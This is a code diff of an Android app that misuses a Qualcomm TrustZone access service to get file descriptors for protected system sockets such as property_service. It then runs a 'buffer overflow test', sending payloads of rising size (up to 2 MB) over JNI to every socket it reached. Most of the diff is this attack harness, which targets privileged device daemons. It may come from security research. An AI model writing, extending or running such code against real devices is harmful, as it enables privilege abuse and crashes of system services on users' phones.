@@ -44,7 +44,7 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
     private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
-    private static final String PROPERTY_SERVICE_PATH = "/dev/socket/mdnsd";
+    private static final String PROPERTY_SERVICE_PATH = "/dev/socket/property_service";
 
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
@@ -233,11 +233,12 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        if (successSockets.contains(PROPERTY_SERVICE_PATH)) {
-            appendLog("========== Buffer Overflow Test via JNI ==========");
-            testBufferOverflow();
+        // バッファオーバーフロー試験：成功した全ソケットに対して実施
+        if (!successSockets.isEmpty()) {
+            appendLog("========== Buffer Overflow Test on ALL Sockets via JNI ==========");
+            testBufferOverflowAllSockets();
         } else {
-            appendLog("========== Property Service not available, skipping overflow test ==========");
+            appendLog("========== No successful sockets, skipping overflow test ==========");
         }
 
         appendLog("========== ALL TESTS COMPLETED ==========");
@@ -416,28 +417,45 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    private void testBufferOverflow() {
-        ParcelFileDescriptor pfd = null;
-        try {
-            int[] iArr = new int[1];
-            pfd = mTZService.a(PROPERTY_SERVICE_PATH, iArr);
-            if (pfd == null) {
-                appendLog("[BOF] Failed to get FD for property_service");
-                return;
+    // バッファオーバーフロー試験：全成功ソケットに対して実行
+    private void testBufferOverflowAllSockets() {
+        // 試験するサイズ（バイト）を段階的に増やす
+        int[] sizes = {1024 * 10, 1024 * 100, 1024 * 512, 1024 * 1024, 1024 * 1024 * 2};
+        // パターン文字列 "hellooo"
+        byte[] pattern = "hellooo".getBytes(StandardCharsets.UTF_8);
+
+        for (String path : successSockets) {
+            if (stopRequested.get()) break;
+            appendLog("[BOF] Testing socket: " + path);
+
+            ParcelFileDescriptor pfd = null;
+            try {
+                int[] iArr = new int[1];
+                pfd = mTZService.a(path, iArr);
+                if (pfd == null) {
+                    appendLog("[BOF] Failed to get FD for " + path);
+                    continue;
+                }
+
+                for (int size : sizes) {
+                    if (stopRequested.get()) break;
+                    appendLog("[BOF] Sending " + size + " bytes to " + path);
+                    byte[] payload = new byte[size];
+                    for (int i = 0; i < size; i++) {
+                        payload[i] = pattern[i % pattern.length];
+                    }
+                    int written = nativeSendLongData(pfd, payload, payload.length);
+                    appendLog("[BOF] JNI write returned: " + written + " for size " + size);
+                    // 少し待ってから次のサイズへ
+                    try { Thread.sleep(100); } catch (InterruptedException ignored) {}
+                }
+            } catch (Exception e) {
+                appendLog("[BOF] Error on " + path + ": " + e.toString());
+            } finally {
+                if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
             }
-            byte[] pattern = "AAAAAA".getBytes(StandardCharsets.UTF_8);
-            int totalSize = 4096 * 256;
-            byte[] payload = new byte[totalSize];
-            for (int i = 0; i < totalSize; i++) {
-                payload[i] = pattern[i % pattern.length];
-            }
-            appendLog("[BOF] Sending " + totalSize + " bytes of 'hellooo' pattern via JNI...");
-            int written = nativeSendLongData(pfd, payload, payload.length);
-            appendLog("[BOF] JNI write returned: " + written);
-        } catch (Exception e) {
-            appendLog("[BOF] Error: " + e.toString());
-        } finally {
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+            // 各ソケットの試験後に少し待機
+            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
         }
     }
 }
